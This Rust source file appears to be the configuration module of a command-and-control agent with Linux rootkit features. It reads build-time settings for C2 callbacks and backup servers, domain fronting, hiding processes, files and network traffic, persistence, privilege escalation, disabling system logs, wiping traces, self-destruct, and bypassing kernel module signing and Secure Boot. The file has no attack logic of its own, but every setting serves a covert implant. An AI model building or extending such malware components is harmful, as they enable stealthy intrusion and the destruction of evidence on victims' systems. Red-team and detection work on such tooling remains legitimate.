use chrono::NaiveTime;
use std::collections::HashMap;

/// Get the payload UUID from build-time configuration
pub fn payload_uuid() -> String {
    env!("UUID").to_string()
}

/// Get the callback interval in seconds
pub fn callback_interval() -> u64 {
    env!("callback_interval").parse().unwrap_or(60)
}

/// Get the callback jitter percentage (0-100)
pub fn callback_jitter() -> u64 {
    env!("callback_jitter").parse().unwrap_or(10)
}

/// Get the agent kill date string (format: YYYY-MM-DD)
pub fn killdate() -> String {
    env!("killdate").to_string()
}

/// Get the number of connection retries
pub fn retries() -> u32 {
    env!("connection_retries").parse().unwrap_or(3)
}

/// Get the working hours start time
pub fn working_start() -> NaiveTime {
    let working_hours = env!("working_hours");
    let start_str = working_hours.split('-').next().unwrap_or("00:00");
    NaiveTime::parse_from_str(start_str, "%H:%M").unwrap_or_else(|_| NaiveTime::from_hms_opt(0, 0, 0).unwrap())
}

/// Get the working hours end time
pub fn working_end() -> NaiveTime {
    let working_hours = env!("working_hours");
    let end_str = working_hours.split('-').nth(1).unwrap_or("23:59");
    NaiveTime::parse_from_str(end_str, "%H:%M").unwrap_or_else(|_| NaiveTime::from_hms_opt(23, 59, 59).unwrap())
}

/// Check if encrypted exchange is enabled
pub fn encrypted_exchange_check() -> String {
    env!("encrypted_exchange_check").to_string()
}

/// Get the rootkit default stealth level (1-5)
pub fn default_stealth_level() -> u8 {
    env!("default_stealth_level").parse().unwrap_or(3)
}

/// Check if anti-detection measures should be enabled by default
pub fn default_anti_detection() -> bool {
    env!("default_anti_detection").parse().unwrap_or(true)
}

/// Check if persistence should be enabled by default
pub fn default_persistence() -> bool {
    env!("default_persistence").parse().unwrap_or(false)
}

/// Get the preferred rootkit technique
pub fn preferred_technique() -> String {
    env!("preferred_technique").to_string()
}

/// Get the C2 server module endpoint for requesting kernel modules
pub fn c2_module_endpoint() -> String {
    env!("c2_module_endpoint").to_string()
}

/// Get the maximum kernel module size in bytes
pub fn max_module_size() -> usize {
    env!("max_module_size").parse().unwrap_or(10_485_760) // 10MB default
}

/// Get the module verification timeout in seconds
pub fn module_verification_timeout() -> u64 {
    env!("module_verification_timeout").parse().unwrap_or(300) // 5 minutes default
}

/// Check if kernel module signing bypass should be attempted
pub fn bypass_module_signing() -> bool {
    env!("bypass_module_signing").parse().unwrap_or(false)
}

/// Get the temporary directory for kernel module operations
pub fn temp_module_dir() -> String {
    env!("temp_module_dir").to_string()
}

/// Get the maximum number of hidden processes
pub fn max_hidden_processes() -> u32 {
    env!("max_hidden_processes").parse().unwrap_or(100)
}

/// Get the maximum number of hidden files
pub fn max_hidden_files() -> u32 {
    env!("max_hidden_files").parse().unwrap_or(1000)
}

/// Get the maximum number of network rules
pub fn max_network_rules() -> u32 {
    env!("max_network_rules").parse().unwrap_or(50)
}

/// Check if process hiding should be aggressive (hide from all tools vs just ps)
pub fn aggressive_process_hiding() -> bool {
    env!("aggressive_process_hiding").parse().unwrap_or(false)
}

/// Check if file hiding should be recursive by default
pub fn recursive_file_hiding() -> bool {
    env!("recursive_file_hiding").parse().unwrap_or(true)
}

/// Get the log modification retention days
pub fn log_retention_days() -> u32 {
    env!("log_retention_days").parse().unwrap_or(7)
}

/// Check if network traffic should be hidden by default
pub fn hide_network_traffic() -> bool {
    env!("hide_network_traffic").parse().unwrap_or(true)
}

/// Get the stealth execution timeout in seconds
pub fn stealth_exec_timeout() -> u64 {
    env!("stealth_exec_timeout").parse().unwrap_or(3600) // 1 hour default
}

/// Get custom rootkit configuration parameters
pub fn custom_rootkit_config() -> HashMap<String, String> {
    let config_str = env!("custom_rootkit_config");
    serde_json::from_str(config_str).unwrap_or_else(|_| HashMap::new())
}

/// Get the kernel symbols sample size for system assessment
pub fn kernel_symbols_sample_size() -> usize {
    env!("kernel_symbols_sample_size").parse().unwrap_or(1000)
}

/// Check if system assessment should be verbose
pub fn verbose_system_assessment() -> bool {
    env!("verbose_system_assessment").parse().unwrap_or(false)
}

/// Get the C2 communication encryption key rotation interval in hours
pub fn key_rotation_interval() -> u64 {
    env!("key_rotation_interval").parse().unwrap_or(24)
}

/// Check if the agent should attempt privilege escalation if needed
pub fn auto_privilege_escalation() -> bool {
    env!("auto_privilege_escalation").parse().unwrap_or(false)
}

/// Get the privilege escalation methods to attempt (comma-separated)
pub fn privilege_escalation_methods() -> Vec<String> {
    let methods_str = env!("privilege_escalation_methods");
    methods_str.split(',').map(|s| s.trim().to_string()).collect()
}

/// Check if the agent should attempt to disable system logging
pub fn disable_system_logging() -> bool {
    env!("disable_system_logging").parse().unwrap_or(false)
}

/// Get the persistence methods to use (comma-separated)
pub fn persistence_methods() -> Vec<String> {
    let methods_str = env!("persistence_methods");
    methods_str.split(',').map(|s| s.trim().to_string()).collect()
}

/// Get the backup C2 servers (comma-separated)
pub fn backup_c2_servers() -> Vec<String> {
    let servers_str = env!("backup_c2_servers");
    if servers_str.is_empty() {
        Vec::new()
    } else {
        servers_str.split(',').map(|s| s.trim().to_string()).collect()
    }
}

/// Check if the agent should use domain fronting
pub fn use_domain_fronting() -> bool {
    env!("use_domain_fronting").parse().unwrap_or(false)
}

/// Get domain fronting domains
pub fn domain_fronting_domains() -> Vec<String> {
    let domains_str = env!("domain_fronting_domains");
    if domains_str.is_empty() {
        Vec::new()
    } else {
        domains_str.split(',').map(|s| s.trim().to_string()).collect()
    }
}

/// Get the agent self-destruct conditions (comma-separated)
pub fn self_destruct_conditions() -> Vec<String> {
    let conditions_str = env!("self_destruct_conditions");
    conditions_str.split(',').map(|s| s.trim().to_string()).collect()
}

/// Check if the agent should wipe traces on exit
pub fn wipe_traces_on_exit() -> bool {
    env!("wipe_traces_on_exit").parse().unwrap_or(true)
}

/// Get the maximum memory usage in MB before triggering cleanup
pub fn max_memory_usage_mb() -> u64 {
    env!("max_memory_usage_mb").parse().unwrap_or(512)
}

/// Get the cleanup interval in minutes
pub fn cleanup_interval_minutes() -> u64 {
    env!("cleanup_interval_minutes").parse().unwrap_or(60)
}

/// Check if debug logging should be enabled
pub fn debug_logging() -> bool {
    env!("debug_logging").parse().unwrap_or(false)
}

/// Get the debug log file path
pub fn debug_log_path() -> String {
    env!("debug_log_path").to_string()
}

/// Get the agent version string
pub fn agent_version() -> String {
    env!("agent_version").to_string()
}

/// Get the build timestamp
pub fn build_timestamp() -> String {
    env!("build_timestamp").to_string()
}

/// Get the target architecture
pub fn target_architecture() -> String {
    env!("target_architecture").to_string()
}

/// Check if static linking was used
pub fn is_statically_linked() -> bool {
    env!("static_build").parse().unwrap_or(false)
}

/// Get the compiler used for building
pub fn compiler_info() -> String {
    env!("compiler_info").to_string()
}

/// Get compilation flags used
pub fn compilation_flags() -> String {
    env!("compilation_flags").to_string()
}

/// Check if this is a debug build
pub fn is_debug_build() -> bool {
    cfg!(debug_assertions)
}

/// Get kernel module compilation parameters
pub fn kernel_module_compile_params() -> HashMap<String, String> {
    let params_str = env!("kernel_module_compile_params");
    serde_json::from_str(params_str).unwrap_or_else(|_| HashMap::new())
}

/// Get supported kernel versions (comma-separated version ranges)
pub fn supported_kernel_versions() -> Vec<String> {
    let versions_str = env!("supported_kernel_versions");
    versions_str.split(',').map(|s| s.trim().to_string()).collect()
}

/// Get minimum required kernel version
pub fn minimum_kernel_version() -> String {
    env!("minimum_kernel_version").to_string()
}

/// Get maximum supported kernel version
pub fn maximum_kernel_version() -> String {
    env!("maximum_kernel_version").to_string()
}

/// Get supported Linux distributions (comma-separated)
pub fn supported_distributions() -> Vec<String> {
    let distros_str = env!("supported_distributions");
    distros_str.split(',').map(|s| s.trim().to_string()).collect()
}

/// Check if the agent should attempt kernel module signing
pub fn attempt_module_signing() -> bool {
    env!("attempt_module_signing").parse().unwrap_or(false)
}

/// Get kernel module signing certificate path
pub fn module_signing_cert_path() -> String {
    env!("module_signing_cert_path").to_string()
}

/// Get kernel module signing private key path
pub fn module_signing_key_path() -> String {
    env!("module_signing_key_path").to_string()
}

/// Check if UEFI Secure Boot bypass should be attempted
pub fn bypass_secure_boot() -> bool {
    env!("bypass_secure_boot").parse().unwrap_or(false)
}

/// Get Secure Boot bypass methods (comma-separated)
pub fn secure_boot_bypass_methods() -> Vec<String> {
    let methods_str = env!("secure_boot_bypass_methods");
    methods_str.split(',').map(|s| s.trim().to_string()).collect()
}